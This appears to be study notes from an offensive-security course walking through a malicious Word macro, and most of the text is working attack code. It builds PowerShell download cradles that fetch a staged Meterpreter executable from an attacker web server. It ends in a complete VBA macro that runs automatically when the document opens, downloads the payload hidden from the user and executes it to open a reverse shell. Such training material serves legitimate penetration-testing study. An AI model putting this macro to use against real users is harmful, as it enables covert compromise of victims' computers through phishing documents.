`downloadfile` takes two arguments: the url of the file to be downloaded and the output filename. the entire download procedure can be written in just four lines of powershell:
```powershell
$url = "http://192.168.119.120/msfstaged.exe"
$out = "msfstaged.exe"
$wc = New-Object Net.WebClient
$wc.DownloadFile($url, $out)
```

in this code listing, we created a variable for the file we want to download, then a variable for the name of the local file. next, we instantiated the `net.webclient` class to create a download cradle from which we then invoke the `downloadfile` method to download the file. in this case, we used the same staged meterpreter executable we created earlier.

we can compress this into a single one-liner:
```powershell
(New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')
```

let's embed this into our word macro using vba and have powershell do the heavy lifting for us. we will slowly build it here, piece by piece, and then review the completed code.

***Most PowerShell download cradles use HTTP or HTTPS, but we could use [TXT records](https://en.wikipedia.org/wiki/TXT_record) and a [DNS transport](https://github.com/evilmog/evilmog/wiki/DNS-Download-Cradle) instead.***


let's start writing our vba code. the first step is to declare our string variable and fill that string with the powershell download cradle code. next, we'll use the `shell` method to start powershell with the one-liner as an argument. we'll then instruct the `shell` method to run the code and hide the output from the user.

This code segment will download the file to the victim's machine:

```vba
Dim str As String
str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')"
Shell str, vbHide
```

before executing this code, we must place the meterpreter executable (**msfstaged.exe**) on our kali web server along with a multi/handler listener.

to execute the meterpreter executable through vba, we must specify the full path. luckily, downloaded content will end up in the current folder of the word document and we can obtain the path name with the `activedocument.path` property:

```
Dim exePath As String
exePath = ActiveDocument.Path & "\" & "msfstaged.exe"
```

since we are downloading the meterpreter executable from a web server and the download time may vary, we must introduce a time delay. unfortunately, microsoft word does not have a `wait` or `sleep` vba function like excel, so we'll implement a custom `wait` method using a [_Do_ loop](https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/doloop-statement) along with the [_Now_](https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/now-function) and [_DateAdd_](https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/dateadd-function) functions.
this will allow us to pass a `wait` parameter (measured in seconds) to pause the execution. to ensure that our _wait_ procedure does not block microsoft word, each iteration calls [_DoEvents_](https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/doevents-function) allowing word to process other actions.
to do this, we'll retrieve the current date and time with the `now` function and save it to the _t_ variable. then we'll use a _do_ loop, which will work through the comparison declared in the _loop until_ statement.

```
Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
```

this code will continue to loop until the comparison is true, which happens when the current time (returned by _now_) is greater than the time returned by the `dateadd` function. this function takes three arguments: a string expression that represents the interval of time (_s_), the number of seconds to wait (_n_), and the current time (_t_).

simply stated, _n_ seconds are added to the time the loop starts, and the result is compared to the current time. once _n_ seconds have passed, the loop completes.

with our `wait` method implemented, we just need to invoke it and then execute the meterpreter executable. to do that, we'll again use the `shell` function and call the _exepath_ we created.

here's the complete vba macro:


```
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')"
    Shell str, vbHide
    Dim exePath As String
    exePath = ActiveDocument.Path & "\" & "msfstaged.exe"
    Wait (2)
    Shell exePath, vbHide

End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
```

Let's review what we did. We built a Word document. When the document is opened, and macros are enabled, our code pulls the Meterpreter executable from our web server. We added a slight time delay to allow the file to completely download. Finally, we executed our payload (which is hidden from the user) which results in a reverse Meterpreter shell.

#### 2. Labs
![[Pasted image 20250623190706.png]]